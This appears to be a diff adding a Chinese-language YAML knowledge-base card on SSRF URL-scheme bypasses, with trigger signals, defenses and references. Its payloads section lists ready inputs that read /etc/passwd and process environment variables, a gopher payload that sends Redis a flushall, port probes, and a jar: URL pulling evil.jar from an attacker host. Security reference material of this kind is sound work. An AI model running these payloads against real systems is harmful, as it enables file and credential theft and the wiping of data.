@@ -1,0 +1,62 @@
+# 技术卡片: SSRF - URL Scheme 绕过
+# 分类: ssrf / scheme-bypass
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: SecAtlas KB-SSRF-003
+
+id: "ssrf-scheme-bypass"
+name: "SSRF URL Scheme 绕过 (file:///gopher:///dict://)"
+category: "ssrf"
+subcategory: "scheme-bypass"
+severity: "critical"
+
+description: |
+  应用仅过滤目标主机但放行任意 URI scheme。
+  file:// 读本地文件，gopher:// 伪造 TCP payload（Redis/SMTP/FastCGI），
+  dict:// 探测端口。
+
+trigger_signals:
+  - "URL 白名单仅校验域名/IP，未限制 scheme"
+  - "目标使用 cURL/PHP file_get_contents/Java URLConnection"
+  - "http://127.0.0.1 被拦截但 file:///etc/passwd 未拦截"
+
+payloads:
+  file_read:
+    - "url=file:///etc/passwd"
+    - "url=file:///proc/self/environ"
+    - "url=file:///var/www/html/config.php"
+    - "url=file:///C:/Windows/win.ini  # Windows"
+  gopher_redis:
+    - "url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall..."
+    - note: "需对 payload 做 URL 编码，%0d%0a 替代 CRLF"
+  gopher_smtp:
+    - note: "伪造 SMTP 发送邮件"
+  dict_probe:
+    - "url=dict://127.0.0.1:6379/info  # Redis INFO"
+    - "url=dict://127.0.0.1:3306/  # MySQL 端口探测"
+    - "url=dict://127.0.0.1:22/  # SSH 端口探测"
+  other_schemes:
+    - "netdoc:///etc/passwd  # Java"
+    - "jar:http://attacker/evil.jar!/  # Java"
+    - "php://filter/convert.base64-encode/resource=/etc/passwd  # PHP"
+    - "expect://id  # PHP (需 expect 扩展)"
+
+success_indicators:
+  - "file:// 返回文件内容"
+  - "gopher:// Redis 返回响应"
+  - "dict:// 返回服务 Banner"
+
+prerequisites:
+  - "SSRF 漏洞存在"
+  - "HTTP 客户端支持多协议"
+  - "目标未限制 URI scheme 白名单"
+
+defense:
+  - "仅允许 http:// 和 https:// scheme"
+  - "PHP: allow_url_fopen=Off, allow_url_include=Off"
+  - "curl: CURLOPT_PROTOCOLS 限制协议"
+
+sources:
+  - kb: "KB-SSRF-003"
+  - ref: "PayloadsAllTheThings: SSRF URL Schemes"
+  - ref: "HackTricks: Gopher SSRF"
